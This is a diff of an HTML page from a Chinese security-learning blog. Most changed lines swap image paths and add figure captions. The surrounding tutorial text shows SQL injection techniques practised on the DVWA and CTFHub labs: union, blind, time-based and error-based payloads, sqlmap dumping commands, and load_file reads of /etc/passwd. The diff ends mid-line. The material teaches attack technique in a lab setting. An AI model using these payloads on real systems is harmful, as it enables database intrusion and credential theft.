@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息 审计源代码 发现主要执行的SQL语句为:  1SEL">
+        <meta name="description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息1 审计源代码 发现主要执行的SQL语句为:  1SE">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入学习">
 <meta property="og:url" content="http://sloth31.github.io/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Sl0th&#39;s Blog">
-<meta property="og:description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息 审计源代码 发现主要执行的SQL语句为:  1SEL">
+<meta property="og:description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息1 审计源代码 发现主要执行的SQL语句为:  1SE">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221721.png">
@@ -53,10 +53,10 @@
     
     
     <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/img/fav.ico" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/img/fav.ico">
+    <link rel="icon" type="image/png" href="/images/fav.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/fav.ico">
     <meta name="theme-color" content="#A31F34">
-    <link rel="shortcut icon" href="/img/fav.ico">
+    <link rel="shortcut icon" href="/images/fav.ico">
     <!--- Page Info-->
     
     <title>
@@ -98,7 +98,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/img/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/day.jpg","dark":"/img/night.jpg"},"title":"Welcome to Sl0th's Blog","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/day.jpg","dark":"/images/night.jpg"},"title":"Welcome to Sl0th's Blog","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
     window.data = {"masonry":false};
   </script>
@@ -150,7 +150,7 @@
         <div class="left">
             
                 <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/img/fav.ico" class="w-full h-full rounded-sm">
+                    <img src="/images/fav.ico" class="w-full h-full rounded-sm">
                 </a>
             
             <a class="logo-title" href="/">
@@ -462,7 +462,7 @@
         
             <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                 <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/img/avatar.JPG">
+                    <img src="/images/avatar.JPG">
                 </div>
                 <div class="info flex flex-col justify-between">
                     <div class="author flex items-center">
@@ -546,12 +546,12 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>SQL注入是指在判断出注入点后，将<strong>恶意的SQL语句</strong>添加到输入参数中，使得后台服务器<u>执行添加的SQL语句</u>，从而达到窃取网站敏感信息等目的</p>
-<h2 id="二、实例及原理"><a href="#二、实例及原理" class="headerlink" title="二、实例及原理"></a>二、实例及原理</h2><h3 id="2-1字符型注入-dvwa平台sql注入简单级别"><a href="#2-1字符型注入-dvwa平台sql注入简单级别" class="headerlink" title="2.1字符型注入(dvwa平台sql注入简单级别)"></a>2.1字符型注入(dvwa平台sql注入简单级别)</h3><h4 id="查看回显"><a href="#查看回显" class="headerlink" title="查看回显"></a>查看回显</h4><p>输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息<br><img  
+<h2 id="二、实例及原理"><a href="#二、实例及原理" class="headerlink" title="二、实例及原理"></a>二、实例及原理</h2><h3 id="2-1字符型注入-dvwa平台sql注入简单级别"><a href="#2-1字符型注入-dvwa平台sql注入简单级别" class="headerlink" title="2.1字符型注入(dvwa平台sql注入简单级别)"></a>2.1字符型注入(dvwa平台sql注入简单级别)</h3><h4 id="查看回显"><a href="#查看回显" class="headerlink" title="查看回显"></a>查看回显</h4><p>输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息<br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png"
                       alt="1"
-                ></p>
+                ><figcaption>1</figcaption></figure></p>
 <h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><ul>
 <li>发现主要执行的SQL语句为:</li>
 </ul>
@@ -572,19 +572,19 @@
 <blockquote>
 <p>由于使用while循环，可以猜想到如果执行的SQL语句union上别的SQL语句(联合查询)，只要查询的字段数和类型相同，每一行的数据都可以被回显出来</p>
 </blockquote>
-<h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>SQL语言中<code>order by</code>关键字用于给查询的表添加排序条件并且处于SELECT语句末尾，正常情况下我们并不知道查询结果的字段名，但可以在<code>order by</code>后直接跟数字1表示按第一字段排序，用此方式发现在输入 <code>1&#39; and order by 3#</code>时发生错误，因此得知查询结果总列数为2,这表示之后union 后的select语句仅仅只能查询<strong>两个字段</strong><br><img  
+<h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>SQL语言中<code>order by</code>关键字用于给查询的表添加排序条件并且处于SELECT语句末尾，正常情况下我们并不知道查询结果的字段名，但可以在<code>order by</code>后直接跟数字1表示按第一字段排序，用此方式发现在输入 <code>1&#39; and order by 3#</code>时发生错误，因此得知查询结果总列数为2,这表示之后union 后的select语句仅仅只能查询<strong>两个字段</strong><br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221721.png"
                       alt="1"
-                ></p>
+                ><figcaption>1</figcaption></figure></p>
 <h4 id="获取库名、表名、字段名"><a href="#获取库名、表名、字段名" class="headerlink" title="获取库名、表名、字段名"></a>获取库名、表名、字段名</h4><ul>
-<li>获取库名,要想获取关键信息，得知道库名、表名、字段名，利用user()和database()函数分别获取用户名和数据库名称<br><img  
+<li>获取库名,要想获取关键信息，得知道库名、表名、字段名，利用user()和database()函数分别获取用户名和数据库名称<br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221259.png"
                       alt="1"
-                ></li>
+                ><figcaption>1</figcaption></figure></li>
 </ul>
 <blockquote>
 <p>由于该情景下union后的select语句必须有两个字段，这里主要获取数据库名称，user()可以替换成其他函数或者常量等等都可以</p>
@@ -599,45 +599,45 @@
 <p>得到表名有两个，分别为<code>guestbook</code>和 <code>users</code>，根据经验判断网站敏感信息存储在users表中</p>
 </blockquote>
 <ul>
-<li><p>获取字段名，<code>information_schema</code>中有一张名为<code>columns</code>的表，其中<code>column_name</code>存储了字段名，通过增加条件<code>table_name = &#39;users&#39;</code>，成功获取<code>users</code>表的字段名<br><img  
+<li><p>获取字段名，<code>information_schema</code>中有一张名为<code>columns</code>的表，其中<code>column_name</code>存储了字段名，通过增加条件<code>table_name = &#39;users&#39;</code>，成功获取<code>users</code>表的字段名<br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221711.png"
                       alt="1"
-                ></p>
+                ><figcaption>1</figcaption></figure></p>
 </li>
-<li><p><strong>获取敏感信息</strong>: 从字段名可看出，user和password存储着重要信息，添加<code>select user, password from dvwa.users</code> 即可得到账号及密码，密码使用了md5加密<br><img  
+<li><p><strong>获取敏感信息</strong>: 从字段名可看出，user和password存储着重要信息，添加<code>select user, password from dvwa.users</code> 即可得到账号及密码，密码使用了md5加密<br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221287.png"
                       alt="1"
-                ></p>
+                ><figcaption>1</figcaption></figure></p>
 </li>
 </ul>
 <h3 id="2-2-整数型注入-CTFHub技能树"><a href="#2-2-整数型注入-CTFHub技能树" class="headerlink" title="2.2 整数型注入(CTFHub技能树)"></a>2.2 整数型注入(CTFHub技能树)</h3><ul>
-<li>输入1，由下方红字提示输入的内容没有被<code>&#39;</code>包裹，这种称为整数型输入，输入<code>1 and 1=2</code>没有回显也可以验证这是整数型注入，因为如果是字符型，字符串’1 and 1&#x3D;2’自动转换成整数1，仍有回显<br><img  
+<li>输入1，由下方红字提示输入的内容没有被<code>&#39;</code>包裹，这种称为整数型输入，输入<code>1 and 1=2</code>没有回显也可以验证这是整数型注入，因为如果是字符型，字符串’1 and 1&#x3D;2’自动转换成整数1，仍有回显<br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221732.png"
                       alt="1"
-                ></li>
+                ><figcaption>1</figcaption></figure></li>
 </ul>
 <blockquote>
 <p>SQL中字符串自动转换成整型规律：从左边第一个字符开始排查起，转换成出现的第一个非数字字符前的数字对应的整型，如果第一个字符就不是数字，则转换成0</p>
 </blockquote>
 <ul>
-<li>继续使用同字符型注入同样的方法，<strong>判断完列数后</strong>在输入的ID后跟上union语句,发现回显仍为id为1的信息，原因猜测是该网页只会回显查询结果的第一行，因此要实现让前一个select语句查询结果为空，可以让其WHERE后跟的条件始终为加，如：<code>1 and 1=2</code><br><img  
+<li>继续使用同字符型注入同样的方法，<strong>判断完列数后</strong>在输入的ID后跟上union语句,发现回显仍为id为1的信息，原因猜测是该网页只会回显查询结果的第一行，因此要实现让前一个select语句查询结果为空，可以让其WHERE后跟的条件始终为加，如：<code>1 and 1=2</code><br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221925.png"
                       alt="1"
-                ></li>
-<li>剩下的同字符型注入一样的流程：得到数据库名、表名、字段名，需要注意的是，查询结果只返回一行，为了防止查询结果有多行无法显示完全，使用<code>group_concat(字段名)</code>函数，将所有行综合为一行输出，最终得到flag<br><img  
+                ><figcaption>1</figcaption></figure></li>
+<li>剩下的同字符型注入一样的流程：得到数据库名、表名、字段名，需要注意的是，查询结果只返回一行，为了防止查询结果有多行无法显示完全，使用<code>group_concat(字段名)</code>函数，将所有行综合为一行输出，最终得到flag<br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222504.png"
                       alt="1"
-                ></li>
+                ><figcaption>1</figcaption></figure></li>
 </ul>
 <h3 id="2-3-SQL盲注"><a href="#2-3-SQL盲注" class="headerlink" title="2.3 SQL盲注"></a>2.3 SQL盲注</h3><p>盲注指SQL语句执行查询后，查询数据不能回显到前端页面中</p>
 <h4 id="可能需要用到的函数、关键字"><a href="#可能需要用到的函数、关键字" class="headerlink" title="可能需要用到的函数、关键字"></a>可能需要用到的函数、关键字</h4><ul>
@@ -657,12 +657,12 @@
 </ul>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch --dbs  <span class="comment">//获取数据库名称,batch意思为不询问输入默认输入Y</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 --tables <span class="comment">//获取表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 --columns <span class="comment">//获取字段名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 -C 字段名 --dump <span class="comment">//获取字段内存储信息</span></span><br></pre></td></tr></table></figure></div>
 
-<p>最终得到flag<br><img  
+<p>最终得到flag<br><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222451.png"
                       alt="1"
-                ></p>
+                ><figcaption>1</figcaption></figure></p>
 <h4 id="时间盲注-字符型为例"><a href="#时间盲注-字符型为例" class="headerlink" title="时间盲注(字符型为例)"></a>时间盲注(字符型为例)</h4><p>仅要求有回显，主要原理是利用SQL中if函数及sleep函数再加上其他用于拆解字符串、转换字符为ASCII码值的函数，sleep函数作为if函数的第二个参数，猜解名称的函数作为if的第一个参数，第三个参数可以任意赋值，但不能与sleep函数相同，因此若猜解函数返回正确，则执行sleep函数，效果为网页延迟了设定的描述才显示。</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> and <span class="title function_">if</span> <span class="params">((ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">100</span>),sleep(<span class="number">3</span>),<span class="number">1</span>)</span> # <span class="comment">//判断数据库名称第一个字符是否为&#x27;d&#x27;，结果显示明显延迟</span></span><br></pre></td></tr></table></figure></div>
 
@@ -837,12 +837,12 @@
  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
 
 <p> 这里只要更换regexp表达式即可</p>
-<p> <img  
+<p> <figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231275.jpg"
                       alt="image-20220708162044974"
-                ></p>
+                ><figcaption>image-20220708162044974</figcaption></figure></p>
 <p> 注：regexp不区分大小写，需要大小写敏感要加上binary关键字</p>
  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">binary</span> database() regexp &quot;^CTF&quot;;</span><br></pre></td></tr></table></figure></div>
 </blockquote>
@@ -891,12 +891,12 @@
 <p>不存在函数</p>
 <blockquote>
 <p>爆数据库</p>
-<p><img  
+<p><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231655.jpg"
                       alt="image-20220708181105742"
-                ></p>
+                ><figcaption>image-20220708181105742</figcaption></figure></p>
 </blockquote>
 <p>name_const()</p>
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取版本信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> name_const(version(),<span class="number">0x1</span>),name_const(version(),<span class="number">0x1</span>))a;</span><br><span class="line"># <span class="number">1060</span> <span class="operator">-</span> Duplicate <span class="keyword">column</span> name <span class="string">&#x27;8.0.27&#x27;</span></span><br></pre></td></tr></table></figure></div>
@@ -941,19 +941,19 @@
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(<span class="keyword">user</span>(),<span class="number">1</span>); # 报错回显用户</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(hex(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit</span><br><span class="line"><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subtract((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a),<span class="number">1</span>); # 报错回显用户</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><h3 id="查看限制"><a href="#查看限制" class="headerlink" title="查看限制"></a>查看限制</h3><p>secure_file_priv</p>
-<p><img  
+<p><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232760.jpg"
                       alt="image-20220708190755416"
-                ></p>
+                ><figcaption>image-20220708190755416</figcaption></figure></p>
 <h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>load_file(filename)</p>
-<p><img  
+<p><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232156.jpg"
                       alt="image-20220708190902690"
-                ></p>
+                ><figcaption>image-20220708190902690</figcaption></figure></p>
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="keyword">using</span> utf8);</span><br></pre></td></tr></table></figure></div>
 
 <p>详见<a class="link"   target="_blank" rel="noopener" href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" >SQL注入总结 – cc (ccship.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
@@ -1055,12 +1055,12 @@
 
 <h4 id="performance-schema表"><a href="#performance-schema表" class="headerlink" title="performance_schema表"></a>performance_schema表</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_handles` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line">#包含之前查询记录的表</span><br><span class="line"><span class="keyword">SELECT</span> digest_text <span class="keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="keyword">WHERE</span> digest_text REGEXP DATABASE();</span><br><span class="line">#包含表文件路径的表</span><br><span class="line"><span class="keyword">SELECT</span> file_name <span class="keyword">FROM</span> `performance_schema`.`file_instances` <span class="keyword">WHERE</span> file_name REGEXP DATABASE();</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
+<p><figure class="image-caption"><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232923.jpg"
                       alt="image-20220707221836224"
-                ></p>
+                ><figcaption>image-20220707221836224</figcaption></figure></p>
 <blockquote>
 <p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道flag所在的库和表名时，但无法获取到列名，就需要利用无列名盲注了</p>
 </blockquote>
@@ -1101,22 +1101,22 @@
 <h4 id="values注入"><a href="#values注入" class="headerlink" title="values注入"></a>values注入</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;$log&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;testsetset&#x27;</span><span class="keyword">or</span> sleep(<span class="number">5</span>)) # <span class="string">&#x27;);</span></span><br><span class="line"><span class="string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span><span 